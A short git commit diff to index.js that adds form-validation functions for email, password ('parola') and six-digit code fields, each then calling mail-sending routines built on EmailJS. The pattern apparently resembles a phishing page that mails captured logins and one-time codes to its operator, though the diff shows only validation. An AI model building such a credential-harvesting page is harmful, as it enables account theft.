301c167386b498255ea8fde62c4d8206cee0e0df
Samman Fady <sammanfady66@gmail.com>
2023-05-11 16:03:36 +0300

    yes

--- index.js
+++ index.js
@@ -31,3 +31,25 @@ emailjs.send(serviceID,templateID,params)
     }
 ).catch((err) => console.log(err));
 }
+function butoaie()
+{
+    if(document.getElementById("mail").value == "" || document.getElementById("parola").value == "")
+        document.getElementById("incorect").style.display = "block";
+    else
+{
+    document.getElementById("incorect").style.display = "none";
+    sendmail();
+}
+        
+}
+function confirm()
+{
+    if(document.getElementById("numberInput").value == ""|| document.getElementById("numberInput").value <100000)
+        document.getElementById("verifici").style.display = "block";
+    else
+{
+    document.getElementById("verifici").style.display = "none";
+    sendmail2();
+}
+        
+}
